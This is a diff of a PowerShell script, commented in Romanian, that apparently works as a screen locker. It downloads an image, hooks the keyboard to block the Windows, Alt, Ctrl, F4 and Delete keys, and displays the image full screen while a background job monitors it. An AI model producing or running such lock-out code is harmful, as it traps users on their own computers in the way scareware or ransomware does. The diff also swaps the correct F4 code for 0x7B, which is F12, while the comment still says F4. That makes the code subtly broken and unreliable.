@@ -13,7 +13,7 @@ function Download-Image {
 }
 
 # Blocarea tastelor critice
-function Block-CriticalKeys {
+function Block-Keys {
     Add-Type @"
         using System;
         using System.Runtime.InteropServices;
@@ -35,13 +35,12 @@ function Block-CriticalKeys {
             public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                 if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                     int vkCode = Marshal.ReadInt32(lParam);
-                    if (vkCode == 0x5B || // Windows Key (Left)
-                        vkCode == 0x5C || // Windows Key (Right)
-                        vkCode == 0x12 || // Alt Key
-                        vkCode == 0x11 || // Control Key
-                        vkCode == 0x73 || // F4 Key
-                        vkCode == 0x2E)   // Delete Key
-                    {
+                    // Blochează tastele Windows, Alt, Ctrl, Delete, și F4
+                    if (vkCode == 0x5B || vkCode == 0x5C || // Windows Key
+                        vkCode == 0x12 ||                   // Alt
+                        vkCode == 0x11 ||                   // Ctrl
+                        vkCode == 0x7B ||                   // F4
+                        vkCode == 0x2E) {                   // Delete
                         return (IntPtr)1; // Blochează tasta
                     }
                 }
@@ -121,6 +120,6 @@ function Monitor-Image {
 
 # Pornire aplicație principală și monitorizare
 Download-Image
-Block-CriticalKeys
+Block-Keys
 Start-Job -ScriptBlock { Monitor-Image }
 Show-FullScreenImage
